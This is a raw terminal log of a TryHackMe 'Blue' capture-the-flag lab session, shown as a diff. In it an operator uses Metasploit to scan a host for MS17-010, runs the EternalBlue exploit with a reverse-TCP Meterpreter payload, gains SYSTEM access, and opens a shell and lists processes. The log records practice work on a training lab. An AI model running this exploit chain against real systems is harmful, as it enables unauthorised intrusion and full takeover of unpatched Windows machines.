@@ -1,0 +1,420 @@
+Script started on 2020-11-13 17:40:17-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="143" LINES="28"]
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Blue[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Blue[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Blue[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Blue[00m# msfconsole
+[?2004l[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|                                                  
+[0m[36m# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+[0m
+
+       =[ [33mmetasploit v6.0.15-dev[0m                          ]
++ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with [32msetg RHOSTS x.x.x.x[0m
+
+[?1034h[4mmsf6[0m [0m> ms17-010
+[0m[1m[31m[-][0m Unknown command: ms17-010.
+[4mmsf6[0m [0m> search ms-17-01[K[K[K[K[K[K17-010
+[0m
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     [45mMS17-010[0m EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     [45mMS17-010[0m SMB RCE Detection
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    [45mMS17-010[0m EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     [45mMS17-010[0m EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    [45mMS17-010[0m EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       [32mgreat[0m    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example [32minfo 5[0m, [32muse 5[0m or [32muse exploit/windows/smb/smb_doublepulsar_rce[0m
+
+[4mmsf6[0m [0m> use auxiliary/scanner/smb/smb_ms17_010
+[0m[4mmsf6[0m auxiliary([1m[31mscanner/smb/smb_ms17_010[0m) [0m> set rhosts 10.10.6.11
+[0mrhosts => 10.10.6.11
+[4mmsf6[0m auxiliary([1m[31mscanner/smb/smb_ms17_010[0m) [0m> show options
+[0m
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                 Required  Description
+   ----         ---------------                                                 --------  -----------
+   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS       10.10.6.11                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT        445                                                             yes       The SMB service port (TCP)
+   SMBDomain    .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                      no        The password for the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               yes       The number of concurrent threads (max one per host)
+
+[4mmsf6[0m auxiliary([1m[31mscanner/smb/smb_ms17_010[0m) [0m> run
+[0m
+[1m[32m[+][0m 10.10.6.11:445        - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 10.10.6.11:445        - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31mscanner/smb/smb_ms17_010[0m) [0m> 
+[0m[4mmsf6[0m auxiliary([1m[31mscanner/smb/smb_ms17_010[0m) [0m> back
+[0m[4mmsf6[0m [0m> use exploit/windows/smb/ms17_010_eternalblue
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.17     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> ifconfig wl[K[Ktun0
+[0m[1m[34m[*][0m exec: ifconfig tun0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::7cb7:2d2c:a607:15c1  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 4131  bytes 226402 (221.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5554  bytes 1754136 (1.6 MiB)
+        TX errors 0  dropped 44 overruns 0  carrier 0  collisions 0
+
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set rhosts 10.10.6.11
+[0mrhosts => 10.10.6.11
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.10.6.11       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[34m[*][0m 10.10.6.11:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[1m[32m[+][0m 10.10.6.11:445        - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[1m[34m[*][0m 10.10.6.11:445        - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m 10.10.6.11:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.10.6.11:445 - Connection established for exploitation.
+[1m[32m[+][0m 10.10.6.11:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 10.10.6.11:445 - CORE raw buffer dump (42 bytes)
+[1m[34m[*][0m 10.10.6.11:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[1m[34m[*][0m 10.10.6.11:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[1m[34m[*][0m 10.10.6.11:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[1m[32m[+][0m 10.10.6.11:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 10.10.6.11:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 10.10.6.11:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 10.10.6.11:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 10.10.6.11:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 10.10.6.11:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 10.10.6.11:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 10.10.6.11:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 10.10.6.11:445 - Receiving response from exploit packet
+[1m[32m[+][0m 10.10.6.11:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 10.10.6.11:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 10.10.6.11:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (200262 bytes) to 10.10.6.11
+[1m[34m[*][0m Meterpreter session 1 opened (10.9.185.104:4444 -> 10.10.6.11:49195) at 2020-11-13 17:46:56 -0300
+[0m[0m[1m[32m[+][0m 10.10.6.11:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.10.6.11:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.10.6.11:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[0m[4mmeterpreter[0m > getuid
+[0mServer username: NT AUTHORITY\SYSTEM
+[4mmeterpreter[0m > getsystem
+[0m...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+[4mmeterpreter[0m > getuid
+[0mServer username: NT AUTHORITY\SYSTEM
+[4mmeterpreter[0m > va[K[Kbackground
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> search shell_to_meterpe[Kreter
+[0m
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/[45mshell_to_meterpreter[0m                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example [32minfo 0[0m, [32muse 0[0m or [32muse post/multi/manage/shell_to_meterpreter[0m
+
+[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set [K[K[K[Kys[K[Kuse post/multi/manage/shell_to_meterpreter
+[0m[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.9.185.104:4444 -> 10.10.6.11:49195 (10.10.6.11)
+
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> show options
+[0m
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> session[K[K[K[K[K[K[Kst[Ket session 1
+[0msession => 1
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> show options
+[0m
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION  1                yes       The session to run this module on.
+
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> exploit
+[0m
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4433 
+[1m[31m[-][0m Post failed: Rex::Post::Meterpreter::RequestError 1069: Operation failed: The system cannot find the file specified.
+[1m[31m[-][0m Call stack:
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:173:in `execute'
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:114:in `cmd_exec'
+[1m[31m[-][0m   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:164:in `run'
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> show options
+[0m
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION  1                yes       The session to run this module on.
+
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> show options
+[0m
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST    10.9.185.104     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION  1                yes       The session to run this module on.
+
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> exploit
+[0m
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[31m[-][0m Job 0 is listening on IP 10.9.185.104 and port 4433
+[1m[31m[-][0m A job is listening on the same local port
+[1m[31m[-][0m Failed to start exploit/multi/handler on 4433, it may be in use by another process.
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> exploit[Kset lport 5050
+[0mlport => 5050
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> show options
+[0m
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST    10.9.185.104     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    5050             yes       Port for payload to connect to.
+   SESSION  1                yes       The session to run this module on.
+
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set [K[K[K[Kexploit
+[0m
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:5050 
+[1m[31m[-][0m Post failed: Rex::Post::Meterpreter::RequestError 1069: Operation failed: The system cannot find the file specified.
+[1m[31m[-][0m Call stack:
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:173:in `execute'
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:114:in `cmd_exec'
+[1m[31m[-][0m   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:164:in `run'
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> run
+[0m
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[31m[-][0m Job 1 is listening on IP 10.9.185.104 and port 5050
+[1m[31m[-][0m A job is listening on the same local port
+[1m[31m[-][0m Failed to start exploit/multi/handler on 5050, it may be in use by another process.
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> run[Kset lport 666
+[0mlport => 666
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> set [K[K[K[Krun
+[0m
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Upgrading session ID: 1
+[1m[34m[*][0m Starting exploit/multi/handler
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:666 
+[1m[31m[-][0m Post failed: Rex::Post::Meterpreter::RequestError 1069: Operation failed: The system cannot find the file specified.
+[1m[31m[-][0m Call stack:
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:173:in `execute'
+[1m[31m[-][0m   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:114:in `cmd_exec'
+[1m[31m[-][0m   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:164:in `run'
+[1m[34m[*][0m Post module execution completed
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> shell[K[K[K[K[Ksessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.9.185.104:4444 -> 10.10.6.11:49195 (10.10.6.11)
+
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> session -i 1
+[0m[1m[31m[-][0m Unknown command: session.
+[4mmsf6[0m post([1m[31mmulti/manage/shell_to_meterpreter[0m) [0m> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > getsystem
+[0m...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+[4mmeterpreter[0m > getuid
+[0mServer username: NT AUTHORITY\SYSTEM
+[4mmeterpreter[0m > whoami
+[0m[1m[31m[-][0m Unknown command: whoami.
+[4mmeterpreter[0m > shell
+[0mProcess 2144 created.
+Channel 7 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>exit
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 352   552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 396   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 552   544   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 564   396   Defrag.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\defrag.exe
+ 600   544   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 612   592   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 652   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 688   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 700   600   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 708   600   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 716   600   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 824   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 892   700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 940   700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 1008  652   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1144  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1384  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1396  700   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1468  700   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1600  700   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1680  700   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1948  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 2076  824   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
+ 2368  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 2420  700   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
+ 2544  700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
